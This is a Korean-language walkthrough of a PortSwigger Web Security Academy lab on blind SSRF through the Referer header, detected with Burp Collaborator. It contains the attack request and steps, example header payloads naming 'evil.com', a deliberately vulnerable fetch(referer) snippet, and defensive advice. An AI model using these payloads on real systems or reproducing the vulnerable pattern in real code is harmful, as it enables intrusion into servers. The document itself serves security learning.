# Lab: Blind SSRF with out-of-band detection

## 개요

- **난이도**: Practitioner
- **주제**: Blind SSRF — Referer 헤더 경유 / OOB 탐지 / Burp Collaborator
- **링크**: https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection

## 목표

상품 페이지 방문 시 서버가 분석(Analytics) 목적으로 `Referer` 헤더의 URL 을 fetch 한다. 응답은 반환되지 않는 Blind SSRF 이므로, Burp Collaborator 로 OOB 인터랙션을 탐지해 취약점 존재를 확인한다.

## 001~002 랩과의 차이

```
[001~002 랩 — 응답 반영 SSRF]
  진입점: stockApi 파라미터 (URL 직접 지정)
  응답:   서버가 fetch 한 내용을 그대로 반환
  확인:   HTTP 응답 본문에서 직접 확인

[003 랩 (이번) — Blind SSRF]
  진입점: Referer 헤더 (자동 전송되는 HTTP 헤더)
  응답:   fetch 결과가 응답에 미반영 (Blind)
  확인:   Burp Collaborator OOB 인터랙션으로 탐지
```

## Referer 헤더와 Analytics SSRF

```
Referer 헤더:
  브라우저가 이전 페이지 URL 을 자동으로 전송
  예: 구글에서 example.com 으로 이동 시
    Referer: https://www.google.com/search?q=...

서버의 Analytics 처리 (취약한 구현):
  Referer 값을 로그 수집 또는 분석 서비스로 전달
  → 서버가 Referer URL 에 HTTP 요청을 보냄
  → 방문 경로 추적, 마케팅 분석 등 목적

취약점:
  Referer 헤더는 클라이언트가 임의 값으로 변경 가능
  → 공격자 제어 URL 삽입 → SSRF 발생
  → 응답은 없지만 요청 자체가 발생 (Blind)
```

## 공격 방법

### 페이로드

```http
GET /product?productId=1 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Referer: https://BURP-COLLABORATOR-SUBDOMAIN/
...
```

### 실행 흐름

```
1. Burp Collaborator 서브도메인 복사:
   xxxx.oastify.com

2. 상품 페이지 요청 인터셉트:
   GET /product?productId=1

3. Referer 헤더 변경:
   Referer: https://xxxx.oastify.com/

4. 요청 전송

5. 서버 내부 처리:
   Analytics 모듈이 Referer URL 을 fetch
   → GET https://xxxx.oastify.com/
   → DNS 조회: xxxx.oastify.com

6. Burp Collaborator 확인:
   "Poll now" → DNS 조회 + HTTP 요청 기록 확인
   → Blind SSRF 취약점 존재 확인!

응답 본문: 정상 상품 페이지 (SSRF 내용 없음)
```

## Blind SSRF 와 XXE Blind OOB 비교

```
[XXE Blind OOB — 003~004 랩]
  벡터:   XML 파서의 외부 엔티티 URI
  헤더:   Content-Type: application/xml
  탐지:   SYSTEM "http://Collaborator/"
  제약:   커스텀 헤더 추가 불가 (파서가 처리)

[SSRF Blind OOB (이번)]
  벡터:   서버의 URL fetch 기능
  헤더:   일반 HTTP 헤더 (Referer 등)
  탐지:   Referer 에 Collaborator URL 삽입
  장점:   HTTP 헤더 자유롭게 조작 가능

공통점:
  응답에 내용 없음 → OOB 채널로 탐지
  Burp Collaborator 활용
  탐지 후 심화 기법으로 데이터 탈취 가능
```

## SSRF 진입점 유형

```
[URL 파라미터 — 001~002 랩]
  stockApi=http://...
  imageUrl=http://...
  → 명시적이고 발견하기 쉬움

[HTTP 헤더 — 003 랩 (이번)]
  Referer: https://...
  X-Forwarded-For: ...
  Host: ...
  → 숨겨진 진입점 → 발견 어려움

[기타 헤더 SSRF 사례]
  X-Forwarded-Host: evil.com
  → 서버가 이 헤더로 리소스 로드 시 SSRF
  Origin: http://internal-service/
  → CORS 처리 중 fetch 발생 시 SSRF
```

## 핵심 정리

- `Referer` 헤더처럼 명시적 URL 파라미터가 아닌 **HTTP 헤더**도 SSRF 진입점이 될 수 있다.
- 응답에 fetch 결과가 없어도 서버가 요청을 보내는 Blind SSRF 는 OOB 채널(Burp Collaborator)로 탐지한다.
- 탐지 방법은 XXE Blind OOB 와 동일하며, 탐지 성공 시 내부 서비스 접근이나 데이터 탈취 심화 기법으로 발전 가능하다.
- **방어**: 서버가 외부 URL 을 fetch 하는 모든 기능에 화이트리스트 적용 — Referer 헤더 기반 fetch 는 제거하거나 내부 처리로 대체.

## 배운 점 및 추가 학습

### 1. Analytics 기능의 SSRF 위험

```
Analytics/추적 목적의 Referer fetch 패턴:

취약한 구현:
  // 방문자 유입 경로 추적
  const referer = request.headers['referer'];
  fetch(referer);  // ← SSRF 취약점

안전한 대안:
  // Referer 를 직접 fetch 하지 않고 로깅만
  logger.info({ referer: request.headers['referer'] });

  // 또는 파싱 후 도메인만 기록
  const parsed = new URL(referer);
  logger.info({ refererDomain: parsed.hostname });
```

### 2. OOB 탐지 도구

```
Burp Collaborator (Burp Suite Pro):
  DNS + HTTP + SMTP 인터랙션 캡처
  Burp → Collaborator → Copy to clipboard

오픈소스 대안:
  interactsh (projectdiscovery):
    interactsh-client → 서브도메인 생성
    DNS/HTTP 인터랙션 캡처

  canarytokens.org:
    웹 기반, 간단한 HTTP/DNS 토큰 생성

  webhook.site:
    HTTP 요청 수신 및 내용 확인
    DNS 조회는 미지원
```

### 3. 001~003 랩 SSRF 비교

| 항목 | 001 (localhost) | 002 (백엔드) | 003 (Blind) |
|------|----------------|-------------|------------|
| 진입점 | URL 파라미터 | URL 파라미터 | Referer 헤더 |
| 응답 반영 | O | O | X (Blind) |
| 결과 확인 | 응답 본문 | 응답 본문 | Collaborator |
| 대상 | localhost | 사설 IP 스캔 | 외부 Collaborator |
| 목적 | 관리자 접근 | 관리자 접근 | 취약점 탐지 |
| 난이도 | Apprentice | Apprentice | Practitioner |
